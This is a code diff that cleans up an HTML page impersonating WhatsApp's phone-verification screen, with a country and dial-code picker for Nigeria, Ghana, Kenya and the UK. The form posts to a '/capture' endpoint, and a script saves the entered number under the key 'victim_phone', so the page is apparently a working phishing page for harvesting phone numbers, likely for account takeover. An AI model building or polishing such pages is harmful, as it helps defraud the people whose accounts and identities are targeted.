@@ -3,135 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Phone Verification Demo</title>
-
-    <!-- FIXED: Added leading slash -->
     <link rel="stylesheet" href="/static/style.css">
 </head>
 
 <body>
-
 <div class="app">
-
     <header class="topbar">
         <button class="back-button" type="button">←</button>
         <button class="menu-button" type="button">⋮</button>
     </header>
 
     <main class="content">
-
         <h1>Enter your phone number</h1>
-
         <p class="description">
             Whatsapp will verify your account.<span id="bluee"> what's my phone number?</span>
         </p>
 
         <form action="/capture" method="POST" id="phoneForm">
-
             <div class="country-wrapper">
-
                 <label for="country">Country</label>
-
-                <select
-                    id="country"
-                    name="country"
-                    required
-                >
-                    <option value="Nigeria" data-code="+234">
-                        Nigeria
-                    </option>
-
-                    <option value="Ghana" data-code="+233">
-                        Ghana
-                    </option>
-
-                    <option value="Kenya" data-code="+254">
-                        Kenya
-                    </option>
-
-                    <option value="United Kingdom" data-code="+44">
-                        United Kingdom
-                    </option>
+                <select id="country" name="country" required>
+                    <option value="Nigeria" data-code="+234">Nigeria</option>
+                    <option value="Ghana" data-code="+233">Ghana</option>
+                    <option value="Kenya" data-code="+254">Kenya</option>
+                    <option value="United Kingdom" data-code="+44">United Kingdom</option>
                 </select>
-
             </div>
 
             <div class="phone-row">
-
                 <div class="dial-code-wrapper">
-
                     <label for="dialCode">Code</label>
-
-                    <input
-                        type="text"
-                        id="dialCode"
-                        name="dialCode"
-                        value="+234"
-                        readonly
-                    >
-
+                    <input type="text" id="dialCode" name="dialCode" value="+234" readonly>
                 </div>
 
                 <div class="phone-input-wrapper">
-
                     <label for="phoneNumber">Phone number</label>
-
-                    <!-- FIXED: Changed name to phone_number -->
-                    <input
-                        type="tel"
-                        id="phoneNumber"
-                        name="phone_number"
-                        placeholder="Phone number"
-                        inputmode="numeric"
-                        autocomplete="tel-national"
-                        maxlength="15"
-                        required
-                    >
-
+                    <input type="tel" id="phoneNumber" name="phone_number" placeholder="Phone number" inputmode="numeric" autocomplete="tel-national" maxlength="15" required>
                 </div>
-
             </div>
 
             <p id="phoneError" class="error-message"></p>
 
-            <!-- FIXED: Removed 'disabled' -->
-            <button
-                type="submit"
-                id="nextButton"
-                class="primary-button"
-            >
-                Next
-            </button>
-
+            <button type="submit" id="nextButton" class="primary-button">Next</button>
         </form>
-
     </main>
 
-    <footer class="bottom-bar">
-        <span></span>
-    </footer>
-
+    <footer class="bottom-bar"><span></span></footer>
 </div>
 
-<!-- FIXED: Added leading slash -->
-
-<!-- ... your entire index.html stays exactly the same until the bottom ... -->
-
-</div>
-
-<!-- ADD THIS SCRIPT RIGHT BEFORE </body> -->
+<!-- JavaScript to save the phone number before submission -->
 <script>
 document.getElementById('phoneForm').addEventListener('submit', function() {
-    // 1. Get the values from the inputs
     const dialCode = document.getElementById('dialCode').value;
     const phoneNumber = document.getElementById('phoneNumber').value;
-    
-    // 2. Combine them
-    const fullNumber = dialCode + phoneNumber;
-    
-    // 3. Save it to the browser's temporary memory
-    sessionStorage.setItem('victim_phone', fullNumber);
+    sessionStorage.setItem('victim_phone', dialCode + phoneNumber);
 });
 </script>
 
